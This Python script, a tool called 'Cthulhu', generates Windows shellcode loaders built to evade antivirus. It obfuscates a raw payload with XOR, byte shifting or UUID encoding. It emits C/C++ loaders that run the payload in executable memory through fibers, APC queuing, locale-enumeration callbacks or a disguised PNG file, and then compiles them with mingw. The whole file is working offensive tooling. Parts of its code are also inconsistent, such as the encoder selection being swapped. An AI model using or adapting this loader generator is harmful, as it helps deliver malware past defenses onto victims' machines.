#!/usr/bin/python
#
# FourEye fork
# Wrote by foxlox [aka calipendula] fortunato dot lodari at dedagroup dot it

import sys
import os
from uuid import UUID
import getopt
import argparse


XOR = "XOR"
ROT13 = "ROT13"
X86 = "X86"
X64 = "X64"

### Fiber
def rot_encoder(shellcode_size, shellcode):
    load = '''
    #include <windows.h>
    int main()
    {
     FreeConsole();
     PVOID mainFiber = ConvertThreadToFiber(NULL);
     unsigned char shellcode[] ;
     for (int i = 0; i < sizeof shellcode; i++)
      shellcode[i] = shellcode[i] - 7;
     PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(shellcodeLocation, shellcode, sizeof shellcode);
     PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
     SwitchToFiber(shellcodeFiber);
     return 0;
    }
    '''

    loads = load.replace('shellcode[]', shellcode, 1)
    with open('/tmp/shellcode.cpp', 'w+') as f:
        f.write(loads)


def xor_encoder(shellcode_size, shellcode):
    load = '''
    #include <windows.h>
    int main()
    {
     FreeConsole();
     PVOID mainFiber = ConvertThreadToFiber(NULL);
     unsigned char shellcode[] ;
     for (int i = 0; i < sizeof shellcode; i++)
      shellcode[i] = shellcode[i] ^ 0x1C ^ 0x5D;
     PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(shellcodeLocation, shellcode, sizeof shellcode);
     PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
     SwitchToFiber(shellcodeFiber);
     return 0;
    }
    '''

    loads = load.replace('shellcode[]', shellcode, 1)
    with open('/tmp/shellcode.cpp', 'w+') as f:
        f.write(loads)

def Fiber_rot_13(fname):
    shellcode_add = fname
    shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) + 0x07
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "shellcode[] = \"" + shellcode + "\""
    rot_encoder(shellcode_size, shellcodes)

def Fiber_xor(fname):
    shellcode_add = fname
    shellcode = ''
    new_shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) ^ 0x5D ^ 0x1C
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "shellcode[] = \"" + shellcode + "\""
    xor_encoder(shellcode_size, shellcodes)
### end Fiber

### APC
def rot_encode(shellcode_size, shellcode):
    load = '''
        #include <stdio.h>
        #include <windows.h>
        #include <string.h>
        int main(int argc, char* argv[]) {
        FreeConsole();
        char default_shell[] ;
        char* shellcode;
        int shellcode_size = 0;
        for (int i = 0; i < sizeof default_shell; i++)
         default_shell[i] = default_shell[i] - 9;
        shellcode = default_shell;
        shellcode_size = sizeof(default_shell);
        char* testString3 = ((char[]){'V','i','r','t','u','a','l','A','l','l','o','c','E','x','\0'});
        char* testString4 = ((char[]){'k','e','r','n','e','l','3','2','\0'});
        HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());
        FARPROC Allocate = GetProcAddress(GetModuleHandle(testString4), testString3);
        char* buffer = (char*)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        CopyMemory(buffer, shellcode, shellcode_size);
        QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);
        SleepEx(5, 3);
       }
    '''

    loads = load.replace('default_shell[]', shellcode, 1)
    with open('/tmp/shellcode.c', 'w+') as f:
        f.write(loads)


def xor_encode(shellcode_size, shellcode):
    load = '''
        #include <stdio.h>
        #include <windows.h>
        #include <string.h>
        int main(int argc, char* argv[]) {
        FreeConsole();
        char default_shell[] ;
        char* shellcode;
        int shellcode_size = 0;
        for (int i = 0; i < sizeof default_shell; i++)
         default_shell[i] = default_shell[i] ^ 0x0F ^ 0x05 ^ 0x0D ^ 0x02;
        shellcode = default_shell;
        shellcode_size = sizeof(default_shell);
        char* testString3 = ((char[]){'V','i','r','t','u','a','l','A','l','l','o','c','E','x','\0'});
        char* testString4 = ((char[]){'k','e','r','n','e','l','3','2','\0'});
        HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());
        FARPROC Allocate = GetProcAddress(GetModuleHandle(testString4), testString3);
        char* buffer = (char*)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        CopyMemory(buffer, shellcode, shellcode_size);
        QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);
        SleepEx(5, 3);
       }
    '''

    loads = load.replace('default_shell[]', shellcode, 1)
    with open('/tmp/shellcode.c', 'w+') as f:
        f.write(loads)


def APC_rot13(fname):
    shellcode_add = fname
    shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) + 0x09
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "default_shell[] = \"" + shellcode + "\""
    rot_encode(shellcode_size, shellcodes)

def APC_xor(fname):
    shellcode_add = fname
    shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) ^ 0x02 ^ 0x0D ^ 0x05 ^ 0x0F
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "default_shell[] = \"" + shellcode + "\""
    xor_encode(shellcode_size, shellcodes)
### end APC


### PNG
def PNGShellcode(fname):
    shellcode_add = fname
    os.system('mv ' + shellcode_add + ' /root/shell.png')
    load = '''
        #include <windows.h>
        #include <stdlib.h>
        #include <stdio.h>
        int main(){
            FreeConsole();
            FILE* fp;
            size_t size;
            unsigned char* buffer;
            fp = fopen("shell.png","rb");
            fseek(fp,0,SEEK_END);
            size = ftell(fp);
            fseek(fp,0,SEEK_SET);
            buffer = (unsigned char*)malloc(size);
            fread(buffer,size,1,fp);
            void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            memcpy(exec, buffer, size);
            ((void(*)())exec)();
            return 0;
        }
        
         '''
    with open('/tmp/shellcode.cpp', 'w+') as f:
        f.write(load)

### end PNG

### UUID

def UUIDShellcode(fname):
    shellcode_add = fname
    offset = 0
    with open(shellcode_add, "rb") as f:
        bin = f.read()
    out = ""
    while (offset < len(bin)):
        countOfBytesToConvert = len(bin[offset:])
        if countOfBytesToConvert < 16:
            ZerosToAdd = 16 - countOfBytesToConvert
            byteString = bin[offset:] + (b'\x00' * ZerosToAdd)
            uuid = UUID(bytes_le=byteString)
        else:
            byteString = bin[offset:offset + 16]
            uuid = UUID(bytes_le=byteString)
        offset += 16
        out += "\"{}\",\n".format(uuid)
    print(out)

    load = '''   
        #include <windows.h>
        #include <rpc.h>
        #include <stdio.h>
        const char* uuids[] ;
        
        int main()
        {
            FreeConsole();
            HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
            void* ha = HeapAlloc(hc, 0, 0x100000);
            DWORD_PTR hptr = (DWORD_PTR)ha;
            int elems = sizeof(uuids) / sizeof(uuids[0]);
            for (int i = 0; i < elems; i++) {
                RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
                if (status != RPC_S_OK) {
                    printf("UuidFromStringA() != S_OK");
                    CloseHandle(ha);
                    return -1;
                }
                 hptr += 16;
            }
            EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
            CloseHandle(ha);
            return 0;
        }
    '''

    shellcodes = "uuids[] = {" + out + "}"
    loads = load.replace('uuids[]', shellcodes, 1)
    with open('/tmp/shellcode.c', 'w+') as f:
        f.write(loads)
### end UUID

### generate
def x64cpp_execute():
    try:
        os.system('x86_64-w64-mingw32-g++ ' + '/tmp/shellcode.cpp' + ' -o ' + '/tmp/shellcode.exe' + " --static" + " -w")
        print("[+]shellcode created: /tmp/shellcode.exe\n")
    except:
        print("[-]error\n")


def x86cpp_execute():
    try:
        os.system('i686-w64-mingw32-g++ ' + '-m32 ' + '/tmp/shellcode.cpp' + ' -o ' + '/tmp/shellcode.exe' + " --static" + " -w")
        print("[+]shellcode created: /tmp/shellcode.exe\n")
    except:
        print("[-]error\n")

def x64c_execute():
    try:
        os.system('x86_64-w64-mingw32-gcc ' + '/tmp/shellcode.c' + ' -o ' + '/tmp/shellcode.exe' + " --static" + " -w")
        print("[+]shellcode created: /tmp/shellcode.exe\n")
    except:
        print("[-]error\n")

def x86c_execute():
    try:
        os.system('i686-w64-mingw32-gcc ' + '-m32 ' + '/tmp/shellcode.c' + ' -o ' + '/tmp/shellcode.exe' + " --static" + " -w")
        print("[+]shellcode created: /tmp/shellcode.exe\n")
    except:
        print("[-]error\n")

def x64_uuid_execute():
    try:
        os.system('x86_64-w64-mingw32-gcc ' + '/tmp/shellcode.c' + ' -o ' + '/tmp/shellcode.exe' + " -lrpcrt4" + " --static" + " -w")
        print("[+]shellcode created: /tmp/shellcode.exe\n")
    except:
        print("[-]error\n")

def x86_uuid_execute():
    try:
        os.system('x86_64-w64-mingw32-gcc ' + '-m32 ' + '/tmp/shellcode.c' + ' -o ' + '/tmp/shellcode.exe' + " --static" + " -w" + " -lrpcrt4")
        os.system('rm -rf '+ '/tmp/shellcode.c')
        print("[+]shellcode created: /tmp/shellcode.exe\n")
    except:
        print("[-]error\n")


def banner():
    print("Cthulhu 0.3")
    print("“Ph'nglui mglw'nafh Cthulhu R'lyeh wgah'nagl fhtagn. In his house at R'lyeh dead Cthulhu waits dreaming.”")
    print("\r\n")

### end generate


banner()

python_version = sys.version_info[0]

flag = 0
enc = 0
encode = XOR

if python_version != 3:
    print("[-] Unable to run ")
    print("[-] Please run Cthulhu with python 3")
    sys.exit()



argv = sys.argv[1:4]


def usage():
      print ('usage: python3 cthulu.py -method fiber|apc|png|uuid -arch x86|x64 -bin filename.bin -enc xor|rot13')
      print ('python3 cthulu.py --help')
      print("\r\nExample: python3 cthulu -method fiber -arch x64 -bin moana.bin -enc xor")
      print("\r\n         python3 cthulu -method uuid -arch x64 -bin moana.bin")
      exit()

try:
    opts, args = getopt.getopt(argv, 'method:arch:bin:enc:', ['m', 'a', 'b', 'e'])
    if len(opts) == 0 and len(opts) < 5:
      usage()

except getopt.GetoptError:
    usage()

ap = argparse.ArgumentParser()
ap.add_argument("-method", required=True, help="Methods: fiber | apc | uuid | png")
ap.add_argument("-arch", required=True, help="EXE architecture to generate x86 | x64")
ap.add_argument("-bin", required=True, help="Binary file")
ap.add_argument("-enc", required=False, help="Encoder xor | rot13 - it works only with fiber and apc")
args = vars(ap.parse_args())


method=args['method'].upper()
x86_64=args['arch'].upper()
fname=args['bin']
if ((method=="APC") or (method=="FIBER")):
    try:
        encode=args['enc'].upper()
    except:
        pass

from os import path
if not path.exists(fname):
    print("BIN file doesn't exists! Please create it with:")
    print("$ donut inputfilename.exe -o filename.bin")
    exit()

flag=1
if (x86_64==X64):
    flag=2

if not flag in range(1,3):
    print("Please fix: x86 or x64?")
    usage()

enc=1
if (encode==ROT13):
    enc=2

if not enc in range(1,3):
    print(enc)
    if (method=="FIBER" or method=="PNG"):
        print("Please fix: XOR or ROT13?")
        usage()

if (method=="FIBER"):
    if (enc==1):
        Fiber_rot_13(fname)
    else:
        Fiber_xor(fname)
    if (flag==1):
        x86cpp_execute()
    else:
        x64cpp_execute()

if (method=="APC"):
    if (enc==1):
        APC_rot13(fname)
    else:
        APC_xor(fname)
    if (flag==1):
        x86c_execute()
    else:
        x64c_execute()

if (method=="PNG"):
    PNGShellcode(fname)
    if (flag==1):
        x86cpp_execute()
    else:
        x64cpp_execute()

if (method=="UUID"):
    UUIDShellcode(fname)
    if (flag==1):
        x86_uuid_execute()
    else:
        x64_uuid_execute()

print("Method:   "+method);
print("BIN File: "+fname)




#x64
